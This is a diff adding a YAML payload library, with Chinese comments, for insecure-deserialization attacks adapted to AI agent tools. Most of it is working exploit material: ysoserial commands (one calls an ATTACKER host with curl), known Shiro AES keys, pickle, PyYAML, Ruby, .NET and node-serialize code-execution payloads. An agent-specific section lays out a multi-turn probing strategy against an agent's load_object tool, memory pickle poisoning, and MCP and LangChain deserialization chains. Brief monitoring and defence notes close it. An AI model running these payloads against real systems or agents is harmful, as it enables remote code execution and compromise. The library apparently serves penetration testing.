@@ -1,0 +1,338 @@
+# Insecure Deserialization — Agent 场景适配 Payload 库
+# 适配点：Agent 工具接受结构化对象（pickle/yaml/jsonpickle/node-serialize 等）作为输入
+
+metadata:
+  source: codeaudit/hack-skills/deserialization-insecure
+  scope: agent tool call params (serialized objects) → deserialization
+  layer: L3_tool_call (反序列化类工具) + L2_memory (持久化恢复)
+  sink_patterns:
+    - "pickle.loads(input)"
+    - "yaml.load(input)"  # 不用 SafeLoader
+    - "jsonpickle.decode(input)"
+    - "shelve.open(input)"
+    - "node-serialize.unserialize(input)"
+
+# ============ 1. 流量指纹 ============
+fingerprinting:
+  java:
+    magic_bytes: "ac ed 00 05 (hex)"
+    base64_magic: "rO0AB"
+    content_type: "application/x-java-serialized-object"
+    protocol: "T3/IIOP（WebLogic 7001, 7002）"
+  php:
+    pattern: 'O:\d+:"ClassName"'
+    array_pattern: 'a:\d+:\{'
+    wrapper: "phar://"
+  python_pickle:
+    magic_bytes: "80 03 / 80 04 (hex, protocol 3/4)"
+    base64_blob: "API 参数 / cookies / Redis 值"
+  ruby_marshal:
+    magic_bytes: "04 08 (hex)"
+  dotnet:
+    binaryformatter: "AAEAAD (base64) / 00 01 00 00 00 (hex)"
+    viewstate: "FF01 / /w (prefix)"
+    jsonnet: "$type property"
+
+# ============ 2. Java — ysoserial ============
+java_ysoserial:
+  primary_tool: ysoserial.jar
+  safe_confirmation_chain: URLDNS
+  chains:
+    - "CommonsCollections1-7（Apache Commons Collections 3.x/4.x）"
+    - "Spring1, Spring2（Spring Framework）"
+    - "Groovy1（Groovy）"
+    - "Hibernate1（Hibernate）"
+    - "JBossInterceptors1（JBoss）"
+    - "Jdk7u21（JDK 7u21，无依赖）"
+  commands:
+    - "java -jar ysoserial.jar URLDNS 'http://UNIQUE.burpcollaborator.net' > probe.bin"
+    - "java -jar ysoserial.jar CommonsCollections1 'curl http://ATTACKER/pwned' > payload.bin"
+    - "java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0"
+  urldns_probe:
+    purpose: DNS-only confirmation（无破坏）
+    payload: "java -jar ysoserial.jar URLDNS 'http://UNIQUE.dnslog.cn'"
+    detection: "DNS 命中 → 确认反序列化"
+  rmiregistry_exploit:
+    payload: "java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 'id'"
+
+# ============ 3. Shiro rememberMe (CVE-2016-4437) ============
+shiro:
+  description: |
+    Shiro 用 AES-CBC 加密序列化对象在 rememberMe cookie
+  known_default_keys:
+    - "kPH+bIxk5D2deZiIxcaaaA=="
+    - "wGJlpLanyXlVB1LUUWolBg=="
+    - "4AvVhmFLUs0KTA3Kprsdag=="
+    - "Z3VucwAAAAAAAAAAAAAAAA=="
+  attack_flow:
+    - "检测：响应设置 rememberMe=deleteMe cookie"
+    - "生成 ysoserial payload（CommonsCollections6 推荐）"
+    - "AES-CBC 加密（已知 key + 随机 IV）"
+    - "Base64 编码 → 设为 rememberMe cookie"
+    - "发送请求 → 服务端解密 → 反序列化 → RCE"
+  dnslog_pre_check:
+    - "java -jar ysoserial.jar URLDNS 'http://xxx.dnslog.cn'"
+
+# ============ 4. WebLogic Deserialization ============
+weblogic:
+  vectors:
+    - "T3 协议（端口 7001）"
+    - "XMLDecoder (CVE-2017-10271) → /wls-wsat/CoordinatorPortType"
+    - "IIOP 协议"
+  t3_probe:
+    - "nmap -sV -p 7001 TARGET（看 T3 / WebLogic banner）"
+
+# ============ 5. PHP — PHPGGC ============
+php_phpggc:
+  description: PHP 反序列化 gadget chain 生成器
+  magic_methods:
+    __wakeup: "立即调用"
+    __destruct: "对象 GC 时"
+    __toString: "对象作字符串时"
+    __call: "不可访问方法时"
+  chains:
+    - "Laravel/RCE1-10"
+    - "Symfony/RCE1-4"
+    - "Guzzle/RCE1"
+    - "Monolog/RCE1-2"
+    - "WordPress/RCE1"
+    - "Slim/RCE1"
+  commands:
+    - "phpggc -l"
+    - "phpggc Laravel/RCE1 system id"
+  phar_deserialization:
+    description: |
+      Phar 归档包含序列化元数据。任何 file_exists(file) 操作
+      在 phar:// URI 上触发反序列化 — 即使没显式 unserialize
+    triggering_functions:
+      - "file_exists()"
+      - "file_get_contents()"
+      - "fopen()"
+      - "is_file()"
+      - "is_dir()"
+      - "copy()"
+      - "filesize()"
+      - "filetype()"
+      - "stat()"
+      - "include()"
+      - "require()"
+      - "getimagesize()"
+    attack_flow:
+      - "上传合法文件（如 JPEG with phar polyglot）"
+      - "触发 file_exists('phar://uploads/avatar.jpg')"
+      - "PHP 反序列化 phar metadata → gadget chain 执行"
+    command: "phpggc -p phar -o exploit.phar Monolog/RCE1 system id"
+  phpmyadmin_case:
+    description: "phpMyAdmin 配置注入"
+    payload: "action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\";s:11:\"/etc/passwd\";}"
+
+# ============ 6. Python — Pickle ============
+python_pickle:
+  __reduce__:
+    description: __reduce__ 返回 (callable, args) — 反序列化时调用
+    payload: |
+      import pickle
+      import os
+
+      class Exploit:
+          def __reduce__(self):
+              return (os.system, ("id",))
+
+      payload = pickle.dumps(Exploit())
+  opcode_analysis:
+    tool: pickletools
+    command: "pickletools.dis(payload)"
+    look_for: "GLOBAL referencing os, subprocess, builtins"
+  dangerous_sinks:
+    - "pickle.loads(user_data)"
+    - "pickle.load(file_handle)"
+    - "yaml.load(data)  # 没有 SafeLoader"
+    - "jsonpickle.decode(data)"
+    - "shelve.open(path)"
+  restricted_unpickler_bypass:
+    description: |
+      即使 RestrictedUnpickler.find_class 设置了白名单，
+      如果白名单含 eval/exec/__import__ → 仍可利用
+    payload: |
+      # 如果 safe_builtins 含 'eval'
+      class Exploit:
+          def __reduce__(self):
+              return (eval, ("__import__('os').system('id')",))
+  pyyaml_rce:
+    payload: |
+      !!python/object/apply:os.system
+      - id
+    payload2: |
+      !!python/object/new:os.system
+      - id
+
+# ============ 7. Ruby ============
+ruby:
+  marshal:
+    magic: "0408"
+    payload: '["040802"].pack("H*")'
+    description: "Marshal.load 等同 Java ObjectInputStream"
+  yaml_load:
+    description: "YAML.load（非 safe_load）执行任意 Ruby 对象"
+    chains:
+      ruby_lt_2_7_2:
+        - |
+          --- !ruby/object:Gem::Requirement
+          requirements:
+            !ruby/object:Gem::DependencyList
+            type: :runtime
+            specs:
+              - !ruby/object:Gem::StubSpecification
+                loaded_from: "|id"
+      ruby_2_x_3_x:
+        - |
+          --- !ruby/hash:Gem::Installer
+          i: x
+          !ruby/hash:Gem::SpecFetcher
+          i: y
+          !ruby/object:Gem::Requirement
+          requirements:
+            !ruby/object:Gem::Package::TarReader
+            io: &1 !ruby/object:Net::BufferedIO
+              io: &1 !ruby/object:Gem::Package::TarReader::Entry
+                read: 0
+                header: "abc"
+              debug_output: &1 !ruby/object:Net::WriteAdapter
+                socket: &1 !ruby/object:Gem::RequestSet
+                  sets: !ruby/object:Net::WriteAdapter
+                    socket: !ruby/module 'Kernel'
+                    method_id: :system
+                  git_set: id
+                method_id: :resolve
+    detection:
+      - "YAML.load('--- !ruby/object:Gem::Fetcher\\nuri: http://BURP/')"
+
+# ============ 8. .NET — ysoserial.net ============
+dotnet:
+  binaryformatter:
+    magic: "AAEAAD / 00 01 00 00 00"
+    commands:
+      - "ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'calc.exe' -o base64"
+      - "ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c 'calc' -o raw"
+  viewstate:
+    payload: "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c 'cmd /c whoami' --validationalg=SHA1 --validationkey=KNOWN_KEY"
+  xmlserializer:
+    description: XmlSerializer + ObjectDataProvider chain
+    payload: |
+      <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:od="http://schemas.microsoft.com/powershell/2004/04" type="System.Windows.Data.ObjectDataProvider">
+        <od:MethodName>Start</od:MethodName>
+        <od:MethodParameters><sys:String>cmd</sys:String><sys:String>/c calc</sys:String></od:MethodParameters>
+        <od:ObjectInstance xsi:type="System.Diagnostics.Process"/>
+      </root>
+  jsonnet:
+    description: JSON.NET TypeNameHandling = Auto/Objects/Arrays/All
+    payload: |
+      {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
+    detection: "JSON 中含 $type property"
+
+# ============ 9. Node.js ============
+nodejs:
+  node_serialize:
+    description: "node-serialize 用 eval 内部"
+    marker: "_$$ND_FUNC$$_"
+    iife_pattern:
+      - 'use () at end to auto-execute'
+      - '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}'
+  funcster:
+    payload: '{"__js_function":"function(){var net=this.constructor.constructor(\'return require\')()(\'child_process\');return net.execSync(\'id\').toString();}"}'
+  cryo: "类似 funcster，序列化 JS 对象支持函数"
+
+# ============ 10. Agent 场景特化 ============
+agent_specific:
+  description: |
+    Agent 工具反序列化场景：
+    1. Agent 工具接受 pickle/yaml/jsonpickle 对象作为参数
+    2. Agent 长期记忆恢复（从 pickle 文件）
+    3. MCP Server 接受结构化对象
+    4. 多代理间传递消息（pickle 序列化）
+  high_risk_tool_patterns:
+    - name: "load_object"
+      severity: critical
+    - name: "unpickle"
+      severity: critical
+    - name: "yaml_parse"
+      severity: high
+    - name: "restore_memory"
+      severity: critical
+      notes: "记忆恢复若用 pickle → critical"
+    - name: "deserialize"
+      severity: high
+    - name: "process_data"
+      severity: low  # 视实现
+    - name: "import_state"
+      severity: critical
+  multi_turn_strategy:
+    turn_1: "询问：'load_object 接受什么类型？'"
+    turn_2: "正常输入：'{\"name\": \"test\"}'"
+    turn_3: "反序列化探测：'{\"__reduce__\": \"test\"}'（观察异常）"
+    turn_4: "RCE payload"
+  memory_pickle_poisoning:
+    description: |
+      Agent 长期记忆若用 pickle 序列化，攻击者可植入恶意对象
+    attack_flow:
+      - "Agent 提供 save_to_memory 工具"
+      - "用户提交 payload，Agent pickle 存储"
+      - "下次加载记忆时触发 __reduce__"
+    detection:
+      - "搜索 agent 代码中 pickle.load / pickle.loads"
+      - "搜索 memory backend 是否用 pickle"
+  mcp_deserialization:
+    description: |
+      MCP Server 若接受 pickle/yaml/jsonpickle 参数，
+      而 MCP Client 直接反序列化 → 攻击链
+    detection:
+      - "MCP 工具描述含 'parse' / 'load' / 'deserialize'"
+      - "MCP 工具 schema 含 binary/object 类型"
+  langchain_state_recovery:
+    description: |
+      LangChain Agent 的 stateful 会话恢复若用 pickle →
+      持久化污染可触发 RCE
+    detection:
+      - "LangChain ConversationBufferMemory 持久化"
+      - "自实现的 save/load state 函数"
+
+# ============ 11. JDK 版本约束 ============
+jdk_constraints:
+  lt_8u121:
+    description: "RMI/LDAP 远程类加载有效"
+  "8u121-8u190":
+    description: "trustURLCodebase=false for RMI; LDAP 仍可用"
+  gte_8u191:
+    description: "RMI 和 LDAP 远程类加载都被阻断"
+  bypass_gte_8u191:
+    description: "用 LDAP 返回序列化 gadget 对象（不是远程类）"
+
+# ============ 12. 沙箱监控 ============
+sandbox_monitoring:
+  process_monitoring:
+    - "fork/execve 异常"
+    - "Java 进程派生 shell"
+    - "Python pickle 反序列化时的 opcode 执行"
+  network_monitoring:
+    - "反序列化 → DNS 探测（URLDNS chain 验证）"
+    - "反序列化 → HTTP 外联（curl 命令链）"
+  file_monitoring:
+    - "/tmp/*.phar 写入"
+    - "/tmp/*.so 写入（Java UDF 升级）"
+    - "YAML 解析器触发 /dev/null 创建（异常）"
+
+# ============ 13. 防御要点 ============
+defense:
+  java:
+    - "JEP 290 反序列化过滤器"
+    - "白名单允许的类"
+    - "避免 ObjectInputStream 处理不可信数据"
+    - "用 JSON/Protobuf 替代"
+  php:
+    - "避免 unserialize() 处理用户输入"
+    - "用 json_decode() 替代"
+    - "阻止 phar:// wrapper"
+  python:
+    - "pickle 只用于可信数据"
+    - "外部输入用 json"
+    - "PyYAML: 总是用 yaml.safe_load()"
